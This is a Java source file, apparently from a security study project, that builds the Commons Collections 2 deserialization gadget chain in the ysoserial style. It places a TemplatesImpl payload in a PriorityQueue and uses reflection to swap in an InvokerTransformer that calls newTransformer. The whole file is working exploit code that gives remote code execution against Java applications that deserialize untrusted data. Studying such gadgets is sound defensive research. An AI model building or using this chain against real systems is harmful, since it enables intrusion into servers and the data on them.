package com.pacemrc.javasec.Gadgets;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;

public class CC2 {

    public static Object getObj(Class<?> cls) throws Exception {

        TemplatesImpl templates = Payload.getTemplatesImpl(cls);
        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(1);

        Reflections.setFieldValue(transformingComparator,"transformer",invokerTransformer);

        return priorityQueue;
    }

}
